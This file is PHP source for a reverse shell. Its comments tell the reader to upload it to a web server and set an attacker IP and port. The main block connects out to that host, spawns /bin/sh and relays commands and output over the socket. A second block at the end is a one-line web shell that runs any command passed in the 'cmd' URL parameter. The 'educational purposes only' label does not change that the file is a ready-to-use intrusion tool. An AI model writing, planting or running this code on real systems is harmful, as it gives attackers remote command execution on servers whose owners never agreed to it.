<?php
// Simple PHP Reverse Shell
// For educational purposes only

// USAGE: Change the IP and PORT to your attacker machine
// Then access this file from a browser after uploading it

$ip = '127.0.0.1';  // CHANGE THIS to your IP
$port = 4444;       // CHANGE THIS to your listening port

// Create a socket
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    echo "Error: $errstr ($errno)";
    exit(1);
}

// Execute commands and send output back
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open('/bin/sh', $descriptorspec, $pipes);

if (is_resource($process)) {
    // Input/output streams
    fwrite($sock, "Connected to PHP reverse shell\n");
    
    // Redirect STDIN, STDOUT, STDERR
    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);
    
    while (1) {
        // Check for input from socket
        if (feof($sock)) {
            break;
        }
        
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
        
        if (in_array($sock, $read_a)) {
            $input = fread($sock, 1024);
            fwrite($pipes[0], $input);
        }
        
        if (in_array($pipes[1], $read_a)) {
            $input = fread($pipes[1], 1024);
            fwrite($sock, $input);
        }
        
        if (in_array($pipes[2], $read_a)) {
            $input = fread($pipes[2], 1024);
            fwrite($sock, $input);
        }
    }
    
    proc_close($process);
}

fclose($sock);
?>

<!-- If the above reverse shell doesn't work, try this simpler version: -->
<?php
// Uncomment and use this if the above doesn't work
system($_GET['cmd']);
?> 